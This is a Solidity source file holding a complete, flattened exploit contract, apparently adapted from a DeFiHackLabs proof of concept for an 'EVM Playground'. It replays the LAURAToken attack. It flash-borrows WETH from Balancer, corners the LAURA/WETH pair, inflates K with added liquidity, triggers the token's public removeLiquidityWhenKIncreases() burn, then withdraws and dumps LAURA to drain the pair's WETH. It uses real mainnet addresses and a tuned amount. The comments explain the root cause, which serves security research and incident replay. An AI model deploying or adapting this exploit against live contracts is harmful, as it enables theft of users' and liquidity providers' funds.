// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2025-01-LAURAToken).
//
// The DeFiHackLabs PoC splits the attack across two contracts (`AttackerC0`
// deploys `AttackerC1` and calls `attack()` on it, all inside AttackerC0's own
// constructor), so there is no callable entrypoint left to record after
// deploy, AND the interesting attack logic (attack()/receiveFlashLoan()) would
// live on a freshly-`new`'d child contract with its own address — which the
// Playground's "exploit" locator (resolved to the top-level deployed contract)
// can't anchor onto. This file is a faithful, FLATTENED copy of the same
// attack into a single contract: the constructor body becomes `run()` (the
// single recorded entrypoint), and AttackerC1's attack()/receiveFlashLoan()
// logic is inlined directly so every attack step executes at the exploit
// contract's own address. Logic and constants are copied verbatim from
// test/LAURAToken_exp.sol (AttackerC0 + AttackerC1 + IFS interface).
//
// Root cause: LAURA (a PumpToken) exposes a PUBLIC, unauthenticated
// removeLiquidityWhenKIncreases() that computes currentK from the LIVE
// (attacker-manipulable) LAURA/WETH pair reserves and, if currentK exceeds
// 105% of a hardcoded INITIAL_UNISWAP_K, deletes LAURA directly out of the
// pair's own balance and calls pair.sync() — an un-compensated, single-sided
// reserve removal. The attacker flash-borrows WETH, buys LAURA to corner the
// pool, adds liquidity to inflate K past the threshold, triggers the burn
// (for free, as the dominant LP holder), then removes liquidity and dumps the
// LAURA back for a net WETH profit.

interface IFS {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);

    // LAURA (PumpToken)
    function removeLiquidityWhenKIncreases() external;

    // WETH9
    function withdraw(uint256 wad) external;

    // UniswapV2Pair
    function token0() external view returns (address);
    function token1() external view returns (address);

    // BalancerVault
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

    // IUniswapV2Router02
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

address constant uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant pairLAURA_WETH = 0xb292678438245Ec863F9FEa64AFfcEA887144240;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
uint256 constant LOAN_AMOUNT = 30000 ether;

// Sized so that after the corner buy + addLiquidity, LAURA's balance held by
// the WETH/LAURA pair drops enough (via removeLiquidityWhenKIncreases) to
// steal all the WETH from the pair.
uint256 constant MAGIC_NUMBER = 11526249223479392795400;

contract LAURATokenDrain {
    // run() is the single recorded entrypoint — mirrors AttackerC0's
    // constructor + AttackerC1's approve() constructor step, flattened here so
    // every attack step below executes at THIS contract's own address (needed
    // for the "exploit" story/vulnerability locators to resolve).
    function run() external {
        IFS(weth).approve(uniV2Router, type(uint256).max);

        address LAURA = IFS(pairLAURA_WETH).token0();
        IFS(LAURA).approve(uniV2Router, type(uint256).max);

        address[] memory tokens = new address[](1);
        tokens[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = LOAN_AMOUNT;
        IFS(balancerVault).flashLoan(
            address(this),
            tokens,
            amounts,
            hex"000000000000000000000000b292678438245ec863f9fea64affcea887144240" // pairLAURA_WETH
        );

        uint256 bal0 = IFS(weth).balanceOf(address(this));

        IFS(weth).withdraw(bal0);

        (bool success, ) = msg.sender.call{value: bal0}("");
        require(success, "Not success");
    }

    // Balancer Vault flash-loan callback — carries out the corner buy, the
    // K-inflating addLiquidity, the removeLiquidityWhenKIncreases() trigger,
    // and the final dump + repay, all at this same contract's address.
    function receiveFlashLoan(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        address LAURA = IFS(pairLAURA_WETH).token0();

        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = LAURA;
        IFS(uniV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MAGIC_NUMBER, // amountIn
            0, // amountOutMin
            path, // path
            address(this), // to
            type(uint256).max
        );

        uint256 bal2 = IFS(LAURA).balanceOf(address(this));

        IFS(uniV2Router).addLiquidity(
            LAURA,
            weth,
            bal2,
            MAGIC_NUMBER,
            0,
            0,
            address(this),
            type(uint256).max
        );

        IFS(LAURA).removeLiquidityWhenKIncreases();
        IFS(pairLAURA_WETH).approve(uniV2Router, type(uint256).max);
        uint256 bal3 = IFS(pairLAURA_WETH).balanceOf(address(this));

        IFS(uniV2Router).removeLiquidity(
            LAURA,
            weth,
            bal3,
            0,
            0,
            address(this),
            type(uint256).max
        );

        uint256 bal4 = IFS(LAURA).balanceOf(address(this));

        path[0] = LAURA;
        path[1] = weth;
        IFS(uniV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bal4,
            0,
            path,
            address(this),
            type(uint256).max
        );
        IFS(weth).transfer(balancerVault, LOAN_AMOUNT);
    }

    receive() external payable {}
}
